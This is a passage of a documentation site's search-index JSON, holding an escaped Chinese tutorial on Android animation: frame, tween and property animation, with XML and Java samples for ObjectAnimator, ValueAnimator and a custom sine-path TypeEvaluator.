\u52a8\u753b\u5206\u7c7b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_1","text":"","title":"\u4f20\u7edf\u52a8\u753b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_2","text":"\u5e27\u52a8\u753b\u662f\u6700\u5bb9\u6613\u5b9e\u73b0\u7684\u4e00\u79cd\u52a8\u753b\uff0c\u8fd9\u79cd\u52a8\u753b\u66f4\u591a\u7684\u4f9d\u8d56\u4e8e\u5b8c\u5584\u7684UI\u8d44\u6e90\uff0c\u4ed6\u7684\u539f\u7406\u5c31\u662f\u5c06\u4e00\u5f20\u5f20\u5355\u72ec\u7684\u56fe\u7247\u8fde\u8d2f\u7684\u8fdb\u884c\u64ad\u653e\uff0c \u4ece\u800c\u5728\u89c6\u89c9\u4e0a\u4ea7\u751f\u4e00\u79cd\u52a8\u753b\u7684\u6548\u679c\uff1b\u6709\u70b9\u7c7b\u4f3c\u4e8e\u67d0\u4e9b\u8f6f\u4ef6\u5236\u4f5cgif\u52a8\u753b\u7684\u65b9\u5f0f\u3002 frame.gif \u5982\u4e0a\u56fe\u4e2d\u7684\u4eac\u4e1c\u52a0\u8f7d\u52a8\u753b\uff0c\u4ee3\u7801\u8981\u505a\u7684\u4e8b\u60c5\u5c31\u662f\u628a\u4e00\u5e45\u5e45\u7684\u56fe\u7247\u6309\u987a\u5e8f\u663e\u793a\uff0c\u9020\u6210\u52a8\u753b\u7684\u89c6\u89c9\u6548\u679c\u3002 \u4eac\u4e1c\u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <animation-list xmlns:android=\"http://schemas.android.com/apk/res/android\"> <item android:drawable=\"@drawable/a_0\" android:duration=\"100\" /> <item android:drawable=\"@drawable/a_1\" android:duration=\"100\" /> <item android:drawable=\"@drawable/a_2\" android:duration=\"100\" /> </animation-list> protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_frame_animation); ImageView animationImg1 = (ImageView) findViewById(R.id.animation1); animationImg1.setImageResource(R.drawable.frame_anim1); AnimationDrawable animationDrawable1 = (AnimationDrawable) animationImg1.getDrawable(); animationDrawable1.start(); } \u53ef\u4ee5\u8bf4\uff0c\u56fe\u7247\u8d44\u6e90\u51b3\u5b9a\u4e86\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5b9e\u73b0\u600e\u6837\u7684\u52a8\u753b \u5728\u6709\u4e9b\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u8fd8\u4f1a\u770b\u5230android\uff1aoneshot=\"false\" \uff0c\u8fd9\u4e2aoneshot \u7684\u542b\u4e49\u5c31\u662f\u52a8\u753b\u6267\u884c\u4e00\u6b21\uff08true\uff09\u8fd8\u662f\u5faa\u73af\u6267\u884c\u591a\u6b21\u3002 \u8fd9\u91cc\u5176\u4ed6\u51e0\u4e2a\u52a8\u753b\u5b9e\u73b0\u65b9\u5f0f\u90fd\u662f\u4e00\u6837\uff0c\u65e0\u975e\u5c31\u662f\u56fe\u7247\u8d44\u6e90\u7684\u5dee\u5f02\u3002","title":"\u5e27\u52a8\u753b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_3","text":"\u8865\u95f4\u52a8\u753b\u53c8\u53ef\u4ee5\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff0c\u5206\u522b\u662f alpha\uff08\u6de1\u5165\u6de1\u51fa\uff09\uff0ctranslate\uff08\u4f4d\u79fb\uff09\uff0cscale\uff08\u7f29\u653e\u5927\u5c0f\uff09\uff0crotate\uff08\u65cb\u8f6c\uff09 \u3002 \u8865\u95f4\u52a8\u753b\u7684\u5b9e\u73b0\uff0c\u4e00\u822c\u4f1a\u91c7\u7528xml \u6587\u4ef6\u7684\u5f62\u5f0f\uff1b\u4ee3\u7801\u4f1a\u66f4\u5bb9\u6613\u4e66\u5199\u548c\u9605\u8bfb\uff0c\u540c\u65f6\u4e5f\u66f4\u5bb9\u6613\u590d\u7528\u3002","title":"\u8865\u95f4\u52a8\u753b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#xml","text":"\u9996\u5148\uff0c\u5728res/anim/ \u6587\u4ef6\u5939\u4e0b\u5b9a\u4e49\u5982\u4e0b\u7684\u52a8\u753b\u5b9e\u73b0\u65b9\u5f0f alpha_anim.xml \u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <alpha xmlns:android=\"http://schemas.android.com/apk/res/android\" android:duration=\"1000\" android:fromAlpha=\"1.0\" android:interpolator=\"@android:anim/accelerate_decelerate_interpolator\" android:toAlpha=\"0.0\" /> scale.xml \u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <scale xmlns:android=\"http://schemas.android.com/apk/res/android\" android:duration=\"1000\" android:fromXScale=\"0.0\" android:fromYScale=\"0.0\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:toXScale=\"1.0\" android:toYScale=\"1.0\"/> \u7136\u540e\uff0c\u5728Activity\u4e2d Animation animation = AnimationUtils.loadAnimation(mContext, R.anim.alpha_anim); img = (ImageView) findViewById(R.id.img); img.startAnimation(animation); \u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0ImageView alpha \u900f\u660e\u53d8\u5316\u7684\u52a8\u753b\u6548\u679c\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528set \u6807\u7b7e\u5c06\u591a\u4e2a\u52a8\u753b\u7ec4\u5408\uff08\u4ee3\u7801\u6e90\u81eaAndroid SDK API\uff09 <?xml version=\"1.0\" encoding=\"utf-8\"?> <set xmlns:android=\"http://schemas.android.com/apk/res/android\" android:interpolator=\"@[package:]anim/interpolator_resource\" android:shareInterpolator=[\"true\" | \"false\"] > <alpha android:fromAlpha=\"float\" android:toAlpha=\"float\" /> <scale android:fromXScale=\"float\" android:toXScale=\"float\" android:fromYScale=\"float\" android:toYScale=\"float\" android:pivotX=\"float\" android:pivotY=\"float\" /> <translate android:fromXDelta=\"float\" android:toXDelta=\"float\" android:fromYDelta=\"float\" android:toYDelta=\"float\" /> <rotate android:fromDegrees=\"float\" android:toDegrees=\"float\" android:pivotX=\"float\" android:pivotY=\"float\" /> <set> ... </set> </set> \u53ef\u4ee5\u770b\u5230\u7ec4\u5408\u52a8\u753b\u662f\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528\u7684\u3002 \u5404\u4e2a\u52a8\u753b\u5c5e\u6027\u7684\u542b\u4e49\u7ed3\u5408\u52a8\u753b\u81ea\u8eab\u7684\u7279\u70b9\u5e94\u8be5\u5f88\u597d\u7406\u89e3\uff0c\u5c31\u4e0d\u4e00\u4e00\u9610\u8ff0\u4e86\uff1b\u8fd9\u91cc\u4e3b\u8981\u8bf4\u4e00\u4e0b interpolator \u548c pivot \u3002 Interpolator \u4e3b\u8981\u4f5c\u7528\u662f\u53ef\u4ee5\u63a7\u5236\u52a8\u753b\u7684\u53d8\u5316\u901f\u7387 \uff0c\u5c31\u662f\u52a8\u753b\u8fdb\u884c\u7684\u5feb\u6162\u8282\u594f\u3002 Android \u7cfb\u7edf\u5df2\u7ecf\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e9bInterpolator \uff0c\u6bd4\u5982 accelerate_decelerate_interpolator\uff0caccelerate_interpolator\u7b49\u3002\u66f4\u591a\u7684interpolator \u53ca\u5176\u542b\u4e49\u53ef\u4ee5\u5728Android SDK \u4e2d\u67e5\u770b\u3002\u540c\u65f6\u8fd9\u4e2aInterpolator\u4e5f\u662f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7684\uff0c\u8fd9\u4e2a\u540e\u9762\u8fd8\u4f1a\u63d0\u5230\u3002 pivot \u51b3\u5b9a\u4e86\u5f53\u524d\u52a8\u753b\u6267\u884c\u7684\u53c2\u8003\u4f4d\u7f6e pivot \u8fd9\u4e2a\u5c5e\u6027\u4e3b\u8981\u662f\u5728translate \u548c scale \u52a8\u753b\u4e2d\uff0c\u8fd9\u4e24\u79cd\u52a8\u753b\u90fd\u7275\u626f\u5230view \u7684\u201c\u7269\u7406\u4f4d\u7f6e\u201c\u53d1\u751f\u53d8\u5316\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e2a\u53c2\u8003\u70b9\u3002\u800cpivotX\u548cpivotY\u5c31\u5171\u540c\u51b3\u5b9a\u4e86\u8fd9\u4e2a\u70b9\uff1b\u5b83\u7684\u503c\u53ef\u4ee5\u662ffloat\u6216\u8005\u662f\u767e\u5206\u6bd4\u6570\u503c\u3002 \u6211\u4eec\u4ee5pivotX\u4e3a\u4f8b\uff0c pivotX\u53d6\u503c \u542b\u4e49 10 \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u81ea\u8eab\u5de6\u8fb9\u7f1810\u50cf\u7d20 10% \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u81ea\u8eab\u5de6\u8fb9\u7f18 \u7684\u8ddd\u79bb\u662f\u6574\u4e2aview\u5bbd\u5ea6\u768410% 10%p \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u7236\u63a7\u4ef6\u5de6\u8fb9\u7f18\u7684\u8ddd\u79bb\u662f\u6574\u4e2aview\u5bbd\u5ea6\u768410% pivotY \u4e5f\u662f\u76f8\u540c\u7684\u539f\u7406\uff0c\u53ea\u4e0d\u8fc7\u53d8\u6210\u7684\u7eb5\u5411\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u660e\u767d\u53ef\u4ee5\u53c2\u8003 \u6e90\u7801 \uff0c\u5728Tweened Animation\u4e2d\u7ed3\u5408seekbar\u7684\u6ed1\u52a8\u89c2\u5bdfrotate\u7684\u53d8\u5316\u7406\u89e3\u3002 rotate1.gif","title":"XML \u5b9e\u73b0"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#java","text":"\u6709\u65f6\u5019\uff0c\u52a8\u753b\u7684\u5c5e\u6027\u503c\u53ef\u80fd\u9700\u8981\u52a8\u6001\u7684\u8c03\u6574\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528xml \u5c31\u4e0d\u5408\u9002\u4e86\uff0c\u9700\u8981\u4f7f\u7528java\u4ee3\u7801\u5b9e\u73b0 private void RotateAnimation() { animation = new RotateAnimation(-deValue, deValue, Animation.RELATIVE_TO_SELF, pxValue, Animation.RELATIVE_TO_SELF, pyValue); animation.setDuration(timeValue); if (keep.isChecked()) { animation.setFillAfter(true); } else { animation.setFillAfter(false); } if (loop.isChecked()) { animation.setRepeatCount(-1); } else { animation.setRepeatCount(0); } if (reverse.isChecked()) { animation.setRepeatMode(Animation.REVERSE); } else { animation.setRepeatMode(Animation.RESTART); } img.startAnimation(animation); } \u8fd9\u91ccanimation.setFillAfter\u51b3\u5b9a\u4e86\u52a8\u753b\u5728\u64ad\u653e\u7ed3\u675f\u65f6\u662f\u5426\u4fdd\u6301\u6700\u7ec8\u7684\u72b6\u6001\uff1banimation.setRepeatCount\u548canimation.setRepeatMode \u51b3\u5b9a\u4e86\u52a8\u753b\u7684\u91cd\u590d\u6b21\u6570\u53ca\u91cd\u590d\u65b9\u5f0f\uff0c\u5177\u4f53\u7ec6\u8282\u53ef\u67e5\u770b\u6e90\u7801\u7406\u89e3\u3002 \u597d\u4e86\uff0c\u4f20\u7edf\u52a8\u753b\u7684\u5185\u5bb9\u5c31\u8bf4\u5230\u8fd9\u91cc\u4e86\u3002","title":"Java \u76f4\u63a5\u5b9e\u73b0"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_4","text":"\u5c5e\u6027\u52a8\u753b\uff0c\u987e\u540d\u601d\u4e49\u5b83\u662f\u5bf9\u4e8e\u5bf9\u8c61\u5c5e\u6027\u7684\u52a8\u753b\u3002\u56e0\u6b64\uff0c\u6240\u6709\u8865\u95f4\u52a8\u753b\u7684\u5185\u5bb9\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u5c5e\u6027\u52a8\u753b\u5b9e\u73b0\u3002","title":"\u5c5e\u6027\u52a8\u753b"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_5","text":"\u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u7528\u5c5e\u6027\u52a8\u753b\u5b9e\u73b0\u4e0a\u9762\u8865\u95f4\u52a8\u753b\u7684\u6548\u679c private void RotateAnimation() { ObjectAnimator anim = ObjectAnimator.ofFloat(myView, \"rotation\", 0f, 360f); anim.setDuration(1000); anim.start(); } private void AlpahAnimation() { ObjectAnimator anim = ObjectAnimator.ofFloat(myView, \"alpha\", 1.0f, 0.8f, 0.6f, 0.4f, 0.2f, 0.0f); anim.setRepeatCount(-1); anim.setRepeatMode(ObjectAnimator.REVERSE); anim.setDuration(2000); anim.start(); } \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u5c5e\u6027\u52a8\u753b\u7684\u65b9\u5f0f\u5206\u522b\u5b9e\u73b0\u4e86\u65cb\u8f6c\u52a8\u753b\u548c\u6de1\u5165\u6de1\u51fa\u52a8\u753b\uff0c\u5176\u4e2dsetDuration\u3001setRepeatMode\u53casetRepeatCount\u548c\u8865\u95f4\u52a8\u753b\u4e2d\u7684\u6982\u5ff5\u662f\u4e00\u6837\u7684\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u5c5e\u6027\u52a8\u753b\u8c8c\u4f3c\u5f3a\u5927\u4e86\u8bb8\u591a\uff0c\u5b9e\u73b0\u5f88\u65b9\u4fbf\uff0c\u540c\u65f6\u52a8\u753b\u53ef\u53d8\u5316\u7684\u503c\u4e5f\u6709\u4e86\u66f4\u591a\u7684\u9009\u62e9\uff0c\u52a8\u753b\u6240\u80fd\u5448\u73b0\u7684\u7ec6\u8282\u4e5f\u66f4\u591a\u3002 \u5f53\u7136\u5c5e\u6027\u52a8\u753b\u4e5f\u662f\u53ef\u4ee5\u7ec4\u5408\u5b9e\u73b0\u7684 ObjectAnimator alphaAnim = ObjectAnimator.ofFloat(myView, \"alpha\", 1.0f, 0.5f, 0.8f, 1.0f); ObjectAnimator scaleXAnim = ObjectAnimator.ofFloat(myView, \"scaleX\", 0.0f, 1.0f); ObjectAnimator scaleYAnim = ObjectAnimator.ofFloat(myView, \"scaleY\", 0.0f, 2.0f); ObjectAnimator rotateAnim = ObjectAnimator.ofFloat(myView, \"rotation\", 0, 360); ObjectAnimator transXAnim = ObjectAnimator.ofFloat(myView, \"translationX\", 100, 400); ObjectAnimator transYAnim = ObjectAnimator.ofFloat(myView, \"tranlsationY\", 100, 750); AnimatorSet set = new AnimatorSet(); set.playTogether(alphaAnim, scaleXAnim, scaleYAnim, rotateAnim, transXAnim, transYAnim); // set.playSequentially(alphaAnim, scaleXAnim, scaleYAnim, rotateAnim, transXAnim, transYAnim); set.setDuration(3000); set.start(); \u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u52a8\u753b\u53ef\u4ee5\u540c\u65f6\u64ad\u653e\uff0c\u6216\u8005\u662f\u6309\u5e8f\u64ad\u653e\u3002","title":"\u5c5e\u6027\u52a8\u753b\u5165\u95e8"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_6","text":"\u5728\u4e0a\u9762\u5b9e\u73b0\u5c5e\u6027\u52a8\u753b\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53cd\u590d\u7684\u4f7f\u7528\u5230\u4e86ObjectAnimator \u8fd9\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u7ee7\u627f\u81eaValueAnimator\uff0c\u4f7f\u7528\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u5bf9\u4efb\u610f\u5bf9\u8c61\u7684 \u4efb\u610f\u5c5e\u6027 \u8fdb\u884c\u52a8\u753b\u64cd\u4f5c\u3002\u800cValueAnimator\u662f\u6574\u4e2a\u5c5e\u6027\u52a8\u753b\u673a\u5236\u5f53\u4e2d\u6700\u6838\u5fc3\u7684\u4e00\u4e2a\u7c7b\uff1b\u8fd9\u70b9\u4ece\u4e0b\u9762\u7684\u56fe\u7247\u4e5f\u53ef\u4ee5\u770b\u51fa\u3002 valueanimator.png \u5c5e\u6027\u52a8\u753b\u6838\u5fc3\u539f\u7406\uff0c\u6b64\u56fe\u6765\u81ea\u4e8eAndroid SDK API \u6587\u6863\u3002 \u5c5e\u6027\u52a8\u753b\u7684\u8fd0\u884c\u673a\u5236\u662f\u901a\u8fc7\u4e0d\u65ad\u5730\u5bf9\u503c\u8fdb\u884c\u64cd\u4f5c\u6765\u5b9e\u73b0\u7684\uff0c\u800c\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u4e4b\u95f4\u7684\u52a8\u753b\u8fc7\u6e21\u5c31\u662f\u7531ValueAnimator\u8fd9\u4e2a\u7c7b\u6765\u8d1f\u8d23\u8ba1\u7b97\u7684\u3002\u5b83\u7684\u5185\u90e8\u4f7f\u7528\u4e00\u79cd\u65f6\u95f4\u5faa\u73af\u7684\u673a\u5236\u6765\u8ba1\u7b97\u503c\u4e0e\u503c\u4e4b\u95f4\u7684\u52a8\u753b\u8fc7\u6e21\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u63d0\u4f9b\u7ed9ValueAnimator\uff0c\u5e76\u4e14\u544a\u8bc9\u5b83\u52a8\u753b\u6240\u9700\u8fd0\u884c\u7684\u65f6\u957f\uff0c\u90a3\u4e48ValueAnimator\u5c31\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5b8c\u6210\u4ece\u521d\u59cb\u503c\u5e73\u6ed1\u5730\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u8fd9\u6837\u7684\u6548\u679c\u3002\u9664\u6b64\u4e4b\u5916\uff0cValueAnimator\u8fd8\u8d1f\u8d23\u7ba1\u7406\u52a8\u753b\u7684\u64ad\u653e\u6b21\u6570\u3001\u64ad\u653e\u6a21\u5f0f\u3001\u4ee5\u53ca\u5bf9\u52a8\u753b\u8bbe\u7f6e\u76d1\u542c\u5668\u7b49\u3002 \u4ece\u4e0a\u56fe\u6211\u4eec\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u901a\u8fc7duration\u3001startPropertyValue\u548cendPropertyValue \u7b49\u503c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9a\u4e49\u52a8\u753b\u8fd0\u884c\u65f6\u957f\uff0c\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u3002\u7136\u540e\u901a\u8fc7start\u65b9\u6cd5\u5f00\u59cb\u52a8\u753b\u3002 \u90a3\u4e48ValueAnimator \u5230\u5e95\u662f\u600e\u6837\u5b9e\u73b0\u4ece\u521d\u59cb\u503c\u5e73\u6ed1\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\u5462\uff1f\u8fd9\u4e2a\u5c31\u662f\u7531TypeEvaluator \u548cTimeInterpolator \u5171\u540c\u51b3\u5b9a\u7684\u3002 \u5177\u4f53\u6765\u8bf4\uff0c TypeEvaluator \u51b3\u5b9a\u4e86\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u3002 TimeInterpolator \u51b3\u5b9a\u4e86\u52a8\u753b\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\u8282\u594f\u3002 \u8bf4\u7684\u901a\u4fd7\u4e00\u70b9\uff0c\u4f60\u6bcf\u5929\u65e9\u6668\u51fa\u95e8\u53bb\u516c\u53f8\u4e0a\u73ed\uff0cTypeEvaluator\u51b3\u5b9a\u4e86\u4f60\u662f\u5750\u516c\u4ea4\u3001\u5750\u5730\u94c1\u8fd8\u662f\u9a91\u8f66\uff1b\u800c\u5f53\u4f60\u51b3\u5b9a\u9a91\u8f66\u540e\uff0cTimeInterpolator\u51b3\u5b9a\u4e86\u4f60\u4e00\u8def\u4e0a\u9a91\u884c\u7684\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u5300\u901f\u7684\u4e00\u8def\u9a91\u5230\u516c\u53f8\uff0c\u4f60\u4e5f\u53ef\u4ee5\u524d\u534a\u7a0b\u9a91\u5f97\u98de\u5feb\uff0c\u540e\u534a\u7a0b\u9a91\u5f97\u6162\u60a0\u60a0\u3002 \u5982\u679c\uff0c\u8fd8\u662f\u4e0d\u7406\u89e3\uff0c\u90a3\u4e48\u5c31\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u5427\u3002\u9996\u5148\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u8fd9\u4e24\u4e2agif\u52a8\u753b\uff0c\u4e00\u4e2a\u5c0f\u7403\u5728\u5c4f\u5e55\u4e0a\u4ee5 y=sin(x) \u7684\u6570\u5b66\u51fd\u6570\u8f68\u8ff9\u8fd0\u884c\uff0c\u540c\u65f6\u5c0f\u7403\u7684\u989c\u8272\u548c\u534a\u5f84\u4e5f\u53d1\u751f\u7740\u53d8\u5316\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u4e24\u5e45\u56fe\u52a8\u753b\u53d8\u5316\u7684\u8282\u594f\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\u3002 anim1.gif anim2.gif \u5982\u679c\u4e0d\u8003\u8651\u5c5e\u6027\u52a8\u753b\uff0c\u8fd9\u6837\u7684\u4e00\u4e2a\u52a8\u753b\u7eaf\u7cb9\u7684\u4f7f\u7528Canvas+Handler\u7684\u65b9\u5f0f\u7ed8\u5236\u4e5f\u662f\u6709\u53ef\u80fd\u5b9e\u73b0\u7684\u3002\u4f46\u662f\u4f1a\u590d\u6742\u5f88\u591a\uff0c\u800c\u4e14\u52a0\u4e0a\u5404\u79cd\u7ebf\u7a0b\uff0c\u4f1a\u5e26\u6765\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u95ee\u9898\u3002 \u8fd9\u91cc\u5c31\u901a\u8fc7\u81ea\u5b9a\u4e49\u5c5e\u6027\u52a8\u753b\u7684\u65b9\u5f0f\u770b\u770b\u8fd9\u4e2a\u52a8\u753b\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u3002","title":"\u5c5e\u6027\u52a8\u753b\u6838\u5fc3\u539f\u7406"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_7","text":"\u8fd9\u4e2a\u52a8\u753b\u6700\u5173\u952e\u7684\u4e09\u70b9\u5c31\u662f \u8fd0\u52a8\u8f68\u8ff9\u3001\u5c0f\u7403\u534a\u5f84\u53ca\u989c\u8272\u7684\u53d8\u5316\uff1b\u6211\u4eec\u5c31\u4ece\u8fd9\u4e09\u4e2a\u65b9\u9762\u5c55\u5f00\u3002\u6700\u540e\u6211\u4eec\u5728\u7ed3\u5408Interpolator\u8bf4\u4e00\u4e0bTimeInterpolator\u7684\u610f\u4e49\u3002","title":"\u5c5e\u6027\u52a8\u753b\u81ea\u5b9a\u4e49\u5b9e\u73b0"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#typeevaluator","text":"\u524d\u9762\u8bf4\u4e86\uff0cTypeEvaluator\u51b3\u5b9a\u4e86\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u3002\u8fd9\u4e2aTypeEvaluator\u662f\u4e2a\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u3002 public class PointSinEvaluator implements TypeEvaluator { @Override public Object evaluate(float fraction, Object startValue, Object endValue) { Point startPoint = (Point) startValue; Point endPoint = (Point) endValue; float x = startPoint.getX() + fraction * (endPoint.getX() - startPoint.getX()); float y = (float) (Math.sin(x * Math.PI / 180) * 100) + endPoint.getY() / 2; Point point = new Point(x, y); return point; } } PointSinEvaluator \u7ee7\u627f\u4e86TypeEvaluator\u7c7b\uff0c\u5e76\u5b9e\u73b0\u4e86\u4ed6\u552f\u4e00\u7684\u65b9\u6cd5evaluate\uff1b\u8fd9\u4e2a\u65b9\u6cd5\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570fraction \u4ee3\u8868\u5f53\u524d\u52a8\u753b\u5b8c\u6210\u7684 \u767e\u5206\u6bd4 \uff0c\u8fd9\u4e2a\u503c\u662f\u5982\u4f55\u53d8\u5316\u7684\u540e\u9762\u8fd8\u4f1a\u63d0\u5230\uff1b\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4ee3\u8868\u52a8\u753b\u7684 \u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c \u3002\u8fd9\u91cc\u6211\u4eec\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0cx\u7684\u503c\u968f\u7740fraction \u4e0d\u65ad\u53d8\u5316\uff0c\u5e76\u6700\u7ec8\u8fbe\u5230\u7ed3\u675f\u503c\uff1by\u7684\u503c\u5c31\u662f\u5f53\u524dx\u503c\u6240\u5bf9\u5e94\u7684sin(x) \u503c\uff0c\u7136\u540e\u7528x \u548c y \u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u70b9\uff08Point\u5bf9\u8c61\uff09\u8fd4\u56de\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2aPointSinEvaluator \u751f\u6210\u5c5e\u6027\u52a8\u753b\u7684\u5b9e\u4f8b\u4e86\u3002 Point startP = new Point(RADIUS, RADIUS);//\u521d\u59cb\u503c\uff08\u8d77\u70b9\uff09 Point endP = new Point(getWidth() - RADIUS, getHeight() - RADIUS);//\u7ed3\u675f\u503c\uff08\u7ec8\u70b9\uff09 final ValueAnimator valueAnimator = ValueAnimator.ofObject(new PointSinEvaluator(), startP, endP); valueAnimator.setRepeatCount(-1); valueAnimator.setRepeatMode(ValueAnimator.REVERSE); valueAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { currentPoint = (Point) animation.getAnimatedValue(); postInvalidate(); } }); \u8fd9\u6837\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u52a8\u753b\u8f68\u8ff9\u7684\u5b9a\u4e49\uff0c\u73b0\u5728\u53ea\u8981\u8c03\u7528valueAnimator.start() \u65b9\u6cd5\uff0c\u5c31\u4f1a\u7ed8\u5236\u51fa\u4e00\u4e2a\u6b63\u5f26\u66f2\u7ebf\u7684\u8f68\u8ff9\u3002","title":"\u7528TypeEvaluator \u786e\u5b9a\u8fd0\u52a8\u8f68\u8ff9"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#_8","text":"\u4e4b\u524d\u6211\u4eec\u8bf4\u8fc7\uff0c\u4f7f\u7528ObjectAnimator \u53ef\u4ee5\u5bf9\u4efb\u610f\u5bf9\u8c61\u7684\u4efb\u610f\u5c5e\u6027\u8fdb\u884c\u52a8\u753b\u64cd\u4f5c\uff0c\u8fd9\u53e5\u8bdd\u662f\u4e0d\u592a\u4e25\u8c28\u7684\uff0c\u8fd9\u4e2a\u4efb\u610f\u5c5e\u6027\u8fd8\u9700\u8981\u6709get \u548c set \u65b9\u6cd5\u3002 public class PointAnimView extends View { /** * \u5b9e\u73b0\u5173\u4e8ecolor \u7684\u5c5e\u6027\u52a8\u753b */ private int color; private float radius = RADIUS; ..... } \u8fd9\u91cc\u5728\u6211\u4eec\u7684\u81ea\u5b9a\u4e49view\u4e2d\uff0c\u5b9a\u4e49\u4e86\u4e24\u4e2a\u5c5e\u6027color \u548c radius\uff0c\u5e76\u5b9e\u73b0\u4e86\u4ed6\u4eec\u5404\u81ea\u7684get set \u65b9\u6cd5\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u7684\u7279\u70b9\u5b9e\u73b0\u5c0f\u7403\u989c\u8272\u53d8\u5316\u7684\u52a8\u753b\u548c\u534a\u5f84\u53d8\u5316\u7684\u52a8\u753b\u3002 ObjectAnimator animColor = ObjectAnimator.ofObject(this, \"color\", new ArgbEvaluator(), Color.GREEN, Color.YELLOW, Color.BLUE, Color.WHITE, Color.RED); animColor.setRepeatCount(-1); animColor.setRepeatMode(ValueAnimator.REVERSE); ValueAnimator animScale = ValueAnimator.ofFloat(20f, 80f, 60f, 10f, 35f,55f,10f); animScale.setRepeatCount(-1); 